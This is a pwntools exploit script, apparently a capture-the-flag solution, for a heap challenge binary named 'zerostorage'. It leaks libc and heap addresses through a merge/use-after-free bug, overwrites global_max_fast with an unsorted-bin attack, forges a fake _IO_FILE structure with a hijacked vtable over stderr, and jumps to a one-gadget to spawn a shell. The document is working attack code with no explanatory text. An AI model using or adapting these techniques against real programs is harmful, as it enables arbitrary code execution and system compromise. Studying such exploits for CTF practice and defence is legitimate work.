#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./zerostorage')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()


def c(idx):
    sla("Your choice: ",idx)

def malloc(size,content):
    c(1)
    sla("Length of new entry: ",size)
    sla("Enter your data: ",content)

def fill(idx,size,content):
    c(2)
    sla("Entry ID: ",idx)
    sla("Length of entry: ",size)
    sla("Enter your data: ",content)

def merge(idx1,idx2):
    c(3)
    sla("ID: ",idx1)
    sla("ID: ",idx2)

def free(idx):
    c(4)
    sla("Entry ID: ",idx)

def show(idx):
    c(5)
    sla("Entry ID: ",idx)

def list(idx):
    c(6)


def build_fake_file(addr,vtable):
    flag=0xfbad2887
    fake_file= p64(flag)               #_flags
    fake_file+=p64(addr)             #_IO_read_io.r
    fake_file+=p64(addr)             #_IO_read_end
    fake_file+=p64(addr)             #_IO_read_base
    fake_file+=p64(addr)             #_IO_write_base
    fake_file+=p64(addr+1)             #_IO_write_io.r
    fake_file+=p64(addr)         #_IO_write_end
    fake_file+=p64(addr)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backuio.base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)
    fake_file+=p64(0)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(0)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__io.d5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2
    fake_file+=p64(vtable)                       #vtable
    return fake_file


malloc(0x40,'0'*0x40) #0
malloc(0x40,'1'*0x40) #1
malloc(0x40,'2'*0x40) #2
malloc(0x40,'3'*0x40) #3
malloc(0x40,'4'*0x40) #4 
malloc(0x1000-0x10,'5'*(0x1000-0x10)) #5
malloc(0x400,'6'*0x400) #6
malloc(0x400,'7'*0x400) #7
malloc(0x40, '8'*0x40) #8
malloc(0x60,'9'*0x60) #9
free(6)
merge(7,5) #6

malloc(0x400,'a'*0x400) #5
merge(0,0) # 7
input()
merge(2,2) # 0

show(7)
ru("No.7:\n")
unsortedbin = u64(rc(8))
main_arena = unsortedbin - 88
print("main_arena:",hex(main_arena))

libc.address = main_arena - 0x00000000003C4B20
print("libc:",hex(libc.address))
heap = u64(rc(8))
heapbase = heap - 0x120
print("heapbase",hex(heapbase))
global_max_fast = main_arena + 0x1cd8
io_stderr = main_arena + 0xa20
lg("global_max_fast:",global_max_fast)
lg("io_stderr:",io_stderr)
onegadget = libc.address + 0xf1247        #0xf03a4  0xf1247 0x45226 0x4527a
heapaddr = heapbase + 0x1b90
lg("heapaddress:",heapaddr) # chunk9

fake_file=build_fake_file(io_stderr,heapaddr)
print("fakefile",fake_file)
payload5 = fake_file[0x10:].ljust(0x1000-0x10,b'f')

print("payload5",payload5)
fill(6,0x1000-0x10,payload5.decode("iso-8859-1"))
merge(5,6)


payload3 = p64(unsortedbin)+p64(global_max_fast-0x10)
fill(7,0x10,payload3.decode("iso-8859-1"))
malloc(0x40,'a'*0x40) 

payload4 = p64(0)*2+p64(onegadget)*10
fill(9,0x60,payload4.decode("iso-8859-1"))

free(2)

io.recvuntil(":")
io.sendline('1')
io.recvuntil(":")
io.sendline("100")

#malloc(100,"\x00"*100)
io.interactive()
